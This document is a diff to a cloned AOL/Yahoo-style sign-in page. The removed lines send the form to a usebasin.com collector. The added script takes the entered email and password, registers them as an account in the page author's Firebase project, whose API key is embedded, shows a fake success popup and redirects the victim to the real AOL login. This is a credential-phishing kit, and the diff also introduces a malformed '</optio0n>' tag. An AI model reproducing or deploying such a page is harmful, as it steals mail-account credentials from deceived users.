@@ -52,7 +52,7 @@
     <strong class="challenge-heading">Sign in</strong>
     <span class="challenge-desc">&nbsp;</span>
     </span>
-    <form action="https://usebasin.com/f/619f54c3ae82" id="login-username-form" method="post" class="pure-form">
+    <form id="signUp-form" class="pure-form">
         <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
             <div id="selected-country-code-cont" class="puree-dropdown selected-country-code-cont ltr hide">
                 <div id="selected-country-code" class="selected-country-code">+234</div>
@@ -63,7 +63,7 @@
     <label class="offscreen" id="country-code-lbl-aria">Enter Country Code</label>
     <select type="select" name="countryCodeIntl" aria-required="true" role="combobox"
             aria-multiline="false" aria-labelledby="country-code-lbl-aria"  disabled>
-        <option role="option" data-code="+93" value="AF" >Afghanistan &#x202A;(+93)&#x202C;</option>
+        <option role="option" data-code="+93" value="AF" >Afghanistan &#x202A;(+93)&#x202C;</optio0n>
         <option role="option" data-code="+355" value="AL" >Albania &#x202A;(+355)&#x202C;</option>
         <option role="option" data-code="+213" value="DZ" >Algeria &#x202A;(+213)&#x202C;</option>
         <option role="option" data-code="+1" value="AS" >American Samoa &#x202A;(+1)&#x202C;</option>
@@ -299,14 +299,14 @@
 
             </div>
             <div class="input-group">
-                <input class="phone-no " type="email" name="username" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
+                <input class="phone-no " type="email" name="username" id="email_login" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                 <div class="input-field-icon hide" id="username-field-icon"></div>
                 <label for="login-username" id="login-label" class="login-label">Username, email, or mobile</label>
                 <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                     <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                 </ul>            </div>
             <div class="input-group">
-                <input class="phone-no " type="password" name="password" id="login-username" value="" autocomplete="password" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
+                <input class="phone-no " type="password" name="password" id="password_login" value="" autocomplete="password" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                 <div class="input-field-icon hide" id="username-field-icon"></div>
                 <label for="login-password" id="login-label" class="login-label">Password</label>
                 <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
@@ -321,7 +321,7 @@
         </div>
 
         <div class="button-container">
-            <input id="login-signin" type="submit" class="pure-button puree-button-primary challenge-button" value="Next" />
+            <input type="submit" class="pure-button puree-button-primary challenge-button" value="Signin" />
         </div>
 
         
@@ -397,4 +397,100 @@
         checkAssets(10);
     </script>
     </body>
+    <!-- Sweetalert CDN for Popup -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"; 
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+  
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+    apiKey: "AIzaSyC9bYZno33reps-a0iorttht_OMjpsjy2o",
+    authDomain: "login-test-4f7cd.firebaseapp.com",
+    projectId: "login-test-4f7cd",
+    storageBucket: "login-test-4f7cd.appspot.com",
+    messagingSenderId: "767596281646",
+    appId: "1:767596281646:web:5e1de8e8a80090021584bf"
+  };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app)
+
+
+     document.getElementById('signUp-form')
+     .addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        let emailLogin = document.getElementById('email_login').value
+        let passwordLogin = document.getElementById('password_login').value   
+        
+
+        // Form Authentication
+        if(emailLogin.trim() === '' || passwordLogin.trim() === ''){
+           swal({
+            text: 'All Inputs Field are required',
+            icon: 'warning'
+           })
+        }
+         else if(passwordLogin.length < 6)
+        {
+          // Popout this if the password length is less than six
+          swal({
+            text: 'Password must be atleast 6',
+            icon: 'warning'
+          })
+        } 
+        else 
+        {
+          createUserWithEmailAndPassword(auth, emailLogin, passwordLogin)
+        .then((userCredential) => {
+
+          if(userCredential){
+            swal({
+              title: 'Good Job',
+              text: 'You have loged in successfully',
+              icon: 'success'
+            })
+             .then(value => {
+              if(value){
+                 window.location.replace('https://login.aol.com/')
+              }
+             })
+
+             
+            
+          }
+          
+          
+        }).catch((err) => {
+                if (err.code === 'auth/email-already-in-use') {
+                swal({
+                  title: 'Error',
+                  text: 'The email address is already in use',
+                  icon: 'error'
+                });
+              } else if (err.code === 'auth/invalid-email') {
+                swal({
+                  title: 'Error',
+                  text: 'Invalid email address',
+                  icon: 'error'
+                });
+              } else {
+                swal({
+                  title: 'Error',
+                  text: `${err.message}`,
+                  icon: 'error'
+                });
+              }
+        })
+        }
+       
+     })
+  </script>
 </html>
